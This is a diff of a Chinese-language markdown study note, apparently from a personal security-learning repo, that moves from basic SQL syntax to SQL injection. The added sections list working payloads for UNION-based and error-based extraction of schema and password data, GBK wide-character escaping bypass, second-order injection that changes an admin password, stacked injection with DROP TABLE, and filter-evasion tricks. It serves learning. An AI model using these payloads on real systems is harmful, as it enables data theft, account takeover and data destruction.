@@ -14,8 +14,8 @@
 
 ### 数据类型
 #### 注释
-- `--`：单行注释，后面内容被忽略
-- `/* ... */`：多行注释，注释内容被忽略
+- `-- `：单行注释（注意后面有空格）
+- `/* ... */`：多行注释
 
 #### 数值类型
 - `INT`: 整数类型
@@ -118,6 +118,12 @@
         FROM table_name 
         WHERE condition;
     ```
+  - 取部分数据: 
+    ```sql
+    SELECT column1, column2
+        FROM table_name 
+        LIMIT offset, count;
+    ```
   - 查询排序: 
     ```sql
     SELECT column1, column2 
@@ -126,7 +132,7 @@
     ```
   - 查询分组: 
     ```sql
-    SELECT column1, COUNT(*)
+    SELECT COUNT(*), column1
         FROM table_name 
         GROUP BY column1
         HAVING COUNT(*) > 1;
@@ -142,26 +148,26 @@
 
 - `WHERE` 条件
 
-| 运算符 | 含义 |
-|---|---|
-| `=`、`<>`、`!=` | 等于、不等于 |
-| `<`、`<=`、`>`、`>=` | 大小比较 |
-| `AND`、`OR`、`NOT` | 逻辑组合 |
-| `BETWEEN` | 闭区间 |
-| `IN` | 属于集合 |
-| `LIKE` | 模式匹配 |
-| `IS NULL` | 判断空值 |
+  | 运算符 | 含义 |
+  |---|---|
+  | `=`、`<>`、`!=` | 等于、不等于 |
+  | `<`、`<=`、`>`、`>=` | 大小比较 |
+  | `AND`、`OR`、`NOT` | 逻辑组合 |
+  | `BETWEEN` | 闭区间 |
+  | `IN` | 属于集合 |
+  | `LIKE` | 模式匹配 |
+  | `IS NULL` | 判断空值 |
 
 - `GROUP BY` 分组
 
-| 聚合函数 | 含义 |
-|---|---|
-| `COUNT(*)` | 行数 |
-| `COUNT(column)` | 非空值行数 |
-| `SUM(column)` | 求和 |
-| `AVG(column)` | 平均值 |
-| `MAX(column)` | 最大值 |
-| `MIN(column)` | 最小值 |
+  | 聚合函数 | 含义 |
+  |---|---|
+  | `COUNT(*)` | 行数 |
+  | `COUNT(column)` | 非空值行数 |
+  | `SUM(column)` | 求和 |
+  | `AVG(column)` | 平均值 |
+  | `MAX(column)` | 最大值 |
+  | `MIN(column)` | 最小值 |
 
 ### 内置函数
 - `IF(condition, true_value, false_value)`：条件判断函数
@@ -191,7 +197,10 @@
 应用把不可信输入作为 SQL 源代码的一部分交给数据库解析。
 
 主要方法为：
-$$ [结束原上下文] \rightarrow [加入攻击表达式] \rightarrow [消除剩余原语句] $$
+```sql
+[结束原上下文] [加入攻击表达式] [消除剩余原语句]
+'             OR 1=1        -- 
+```
 
 ### 判断上下文
 - **字符串上下文**：输入被包裹在单引号或双引号中，`'` 或 `"` 后注入
@@ -207,42 +216,46 @@ $$ [结束原上下文] \rightarrow [加入攻击表达式] \rightarrow [消除�
 
 #### 联合查询（数据获取）
 通过 `UNION` 关键字将攻击者的查询结果与原查询结果合并，从而获取数据
+>[!TIP] 注意
+一般要使原查询无效化，比如 `id=-1` 或 `AND 1=2`，原查询返回空，给目标信息留出回显空间。
 
 1. **确定列数**: 报错表示超出列数上界
     ```sql
-     ORDER BY 1 --
-     ORDER BY 2 --
+    ORDER BY 1 --
+    ORDER BY 2 --
     ...
     ```
 
 2. **确定列类型**: 逐个试出兼容类型
     ```sql
-     UNION SELECT 1,NULL,NULL -- # NULL 兼容大多数类型
-     UNION SELECT 'a',NULL,NULL --
+    UNION SELECT 1,NULL,NULL -- # NULL 兼容大多数类型
+    UNION SELECT 'a',NULL,NULL --
     ...
     ```
 
 3. **确认回显列**: 观察回显结果，确定哪一列可以回显数据
     ```sql
-     UNION SELECT 1,2,3 -- 
+    UNION SELECT 1,2,3 -- 
     ```
 
 4. **获取数据**: 通过回显列获取敏感数据
     ```sql
-     UNION SELECT 1,2,database() -- 获取当前数据库名
-     UNION SELECT 1,2,table_name FROM information_schema.tables -- 获取表名
-     UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users' -- 获取列名
-     UNION SELECT 1,2,password FROM users -- 获取密码
-    ```
+    -- 获取当前数据库名
+    UNION SELECT 1,2,database()
 
-#### 错误基注入（数据获取）
-通过构造错误条件，获取数据库返回的错误信息，从而获取敏感数据
-1. **构造错误**: 通过除零、类型转换等方式触发
-    ```sql
-    AND 1/0 -- # 除零错误
-    AND CAST('abc' AS INT) -- # 类型转换错误
+    -- 获取表名
+    UNION SELECT 1,2,group_concat(table_name) 
+      FROM information_schema.tables 
+      WHERE table_schema='database' 
+
+    -- 获取列名
+    UNION SELECT 1,2,group_concat(column_name) 
+      FROM information_schema.columns 
+      WHERE table_name='users' 
+
+    -- 获取密码
+     UNION SELECT 1,2,password FROM users
     ```
-2. **获取数据**: 通过错误信息获取敏感数据
 
 #### 布尔盲注（数据获取）
 1. **真假对照**：通过构造布尔条件，确认真假条件下的页面差异
@@ -275,20 +288,183 @@ AND IF(query_condition, SLEEP(5), 0) --
 ```
 其余部分思路类似布尔盲注
 
+#### 错误基注入（数据获取）
+通过构造错误条件，获取数据库返回的错误信息中的敏感数据。
+
+##### extractvalue
+格式如下，xpath 格式错误会报错，并显示其内容
+```sql
+extractvalue(target, xpath)
+```
+一般用 `concat(0x7e, target_info)`，其中 `0x7e` 表示 `~`，用于凸显目标信息（有时候用 `"~"` 也行）
+```sql
+-- 获取数据库名
+AND extractvalue(1, concat(0x7e, database())) --
+
+-- 获取表名
+AND extractvalue(1, 
+  concat(0x7e, 
+    (SELECT table_name FROM information_schema.tables)
+  )
+) --
+
+-- 获取列名
+AND extractvalue(1, 
+  concat(0x7e, 
+    (SELECT column_name FROM information_schema.columns WHERE table_name='users')
+  )
+) --
+```
+
+##### updatexml
+格式如下，xpath 格式错误会报错，并显示其内容
+```sql
+updatexml(target, xpath, new_value)
+```
+具体写法和 `extractvalue` 类似
+
+##### 主键重复
+用 `floor` 和 `rand` 生成 0 1 序列
+```sql
+-- 生成 0~1 的随机数
+rand()
+-- 向下取整
+floor()
+-- 生成随机的 0 或 1
+floor(rand()*2)
+-- 固定种子，一定生成 0 1 1 0 1 1 ...
+floor(rand(0)*2) AS f
+```
+
+group by 时，SQL 会建一张临时表，取出一条数据后，用键去临时表查询
+- **键不存在**: 作为新一行插入表中
+- **键存在**: 更新表中数据
+
+按上述 `f` 分组，`f` 会在取出时计算一次，插入临时表时再计算一次，两次结果可能不同。
+|顺序|操作|`f`|临时表键|判断结论|
+|---|---|---|---|---|
+|1|取出第一条数据|0|无|需插入|
+|2|插入到临时表|1|无 -> 1|-|
+|3|取出第二条数据|1|1|无需插入|
+|4|取出第三条数据|0|1|需插入|
+|5|插入到临时表|1|1 -> 1,1|**键冲突！**|
+
+可知表中数据不少于 3 条时，一定会报错，报错信息中包含主键（`f`）的值。将 `f` 与目标信息拼接，即可获取。
+```sql
+SELECT 
+  -- count 聚合触发临时表（不聚合可能不产生临时表）
+  COUNT(*),
+  -- 拼接 f 与目标信息，'~' 强调
+  concat(0x7e, floor(rand(0)*2), database()) AS f
+  -- 需要行数不小于 3 的表，可直接用 information_schema.tables 
+  FROM sometable
+  GROUP BY f
+```
+
+
+
+#### 宽字符注入（辅助技巧）
+一些程序会在将指令交给 SQL 执行前，转义特殊字符，导致注入困难。
+```php
+# addslashes 函数在 ' " \ 等字符前加反斜杠转义
+addslashes($id)
+sql = "SELECT * FROM users WHERE id = '$id'";
+```
+
+GBK 编码中，宽字符（2字节）的编码可能正好是两个合法的单字节字符。
+```c
+"運" = 0x5c 0x27
+  \ = 0x5c
+  ' = 0x27
+```
+
+基于此，在特殊字符前加入特定编码，让即将插入的 `\` 被当作宽字符的一部分。
+```c
+输入:        %df  '
+            0xdf 0x27
+
+addslashes: %df  \    '
+            0xdf 0x5c 0x27
+
+SQL 解码后:  運        '
+            0xdf 0x5c 0x27
+
+单引号 ' 成功被保留，截断上文
+```
+
+#### 二次注入（篡改操作）
+找到一个写入点，写入注入语句。即使被转义或参数化也没关系，此时语句只是被存入数据库暂时隐忍，卧薪尝胆。
+```sql
+UPDATE users SET username='$id'
+
+$id = admin' --
+```
+
+当数据被在读取点被取出时，注入语句执行。时机已到，今日起兵！
+```sql
+UPDATE users SET password='$pass' WHERE username='$id'
+
+$id = admin' --
+$pass = I got you~
+```
+此时用户 `admin` 的密码就被你修改了。本质上二次注入可以展开的攻击取决于“读取点”给出的操作。
+
+#### 堆叠注入（篡改操作）
+如果允许多条 SQL 语句同时执行，可以在原语句后追加任意语句，达到篡改操作的目的。
+```sql
+SELECT * FROM users WHERE username='$id' 
+
+$id = admin'; DROP TABLE users; -- 
+```
+这种最危险，因为可以注入任何命令，不过大部分数据库禁止多条语句执行。
+
+### 过滤绕过
+#### 空格绕过
+空格如果被顾虑，可以用其他代替字符来分割 SQL 关键字
+```sql
+SELECT/**/1,2,3 -- 注释
+
+%0a -- 换行符
+%0b -- 垂直制表符
+%0c -- 换页符
+%0d -- 回车符
+%09 -- 制表符
+
+SELECT(id)FROM(users) -- 括号分割
+SELECT`id`FROM`users` -- 反引号分割
+```
+
+#### 关键字绕过
+普通关键字
+```sql
+SeLeCt -- 大小写混合
+
+SESELECTLECT -- 双写（SE-SELECT-LECT）
+
+SE/**/LECT -- 注释分割
+
+-- 等价替换
+information_schema.tables -> sys.schema_auto_increment_columns
+```
+
+关键符号
+```sql
+-- 逻辑符（等效替换）
+AND -> &&
+OR -> ||
+NOT -> !
+
+-- 等号（等效替换）
+id=1 ->
+        id LIKE 1
+        id IN(1)
+        id BETWEEN 1 AND 1
+        !(id <> 1)
+
+-- 引号（16进制）
+'users' -> 0x7573657273 
+```
+
 ## SQLmap
-`sqlmap <options>`：自动化 SQL 注入工具
-### 目标指定
-- `-u URL`：指定目标 URL
-- `-D database`：指定数据库
-- `-T table`：指定表
-- `-C column`：指定列
-
-### 输出
-- `--dbms`：指定数据库类型
-- `--dbs`：列出数据库
-- `--tables`：列出表
-- `--columns`：列出列
-- `--dump`：导出数据    
-
-
+详见 [SQLmap](../tools/sqlmap.md)
 
